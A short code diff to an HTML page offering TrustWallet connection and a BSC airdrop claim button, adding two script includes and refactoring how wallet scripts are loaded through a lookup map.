@@ -18,6 +18,9 @@
 <button id="connectTrustwalletButton">Connect TrustWallet</button>
 <button id="claimTrustwalletAirdropButton" disabled>Claim Airdrop (BSC)</button>
 
+<script src="js/common.js"></script>
+<script src="js/loader.js"></script>
+
 <script>
   // Function to dynamically load scripts
   function loadScript(src, callback) {
@@ -26,7 +29,6 @@
     script.onload = callback;
     document.head.appendChild(script);
   }
-
 
   // Function to load ABI and config files dynamically based on the network
   async function loadConfigAndABI(network) {
@@ -71,7 +73,7 @@
 
   // Unified Wallet Connection Handler
   function handleWalletConnection(wallet, network, expectedChainId) {
-    loadScript(wallet, () => {
+    loadScript(walletScripts[wallet], () => {
       console.log(`${wallet} script loaded successfully.`);
 
       // Load config and ABI dynamically
@@ -111,7 +113,6 @@
     });
   });
 </script>
-
 
 </body>
 </html>
